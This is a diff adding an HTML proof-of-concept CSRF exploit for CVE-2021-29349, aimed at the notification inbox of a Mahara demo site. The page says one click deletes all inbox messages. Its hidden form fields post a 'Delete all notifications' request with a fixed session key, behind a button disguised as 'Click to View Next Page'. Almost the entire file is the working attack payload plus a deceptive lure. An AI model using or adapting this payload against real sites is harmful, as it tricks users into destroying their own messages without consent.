@@ -1,0 +1,28 @@
+/* Email Box Exploit - CSRF  */
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+}
+
+</head>
+<body>
+
+<div class="bg"></div>
+
+<p>CSRF CVE-2021-29349 , After clicking below button all inbox maill messages will be deleted  !!.</p>
+
+</body>
+
+<form enctype="multipart/form-data" method="POST" action="https://demo.mahara.org/module/multirecipientnotification/inbox.php"><table><input type hidden="text" value="Delete+all+notifications" name="submit">
+<input type hidden="text" value="all" name="type">
+<input type hidden="text" value="L8T0C4WDuMxzakwV" name="sesskey">
+<input type hidden="text" value="" name="pieform_delete_all_notifications">
+</table><input type="submit" value="Click to View Next Page"></form>
+</html>
+
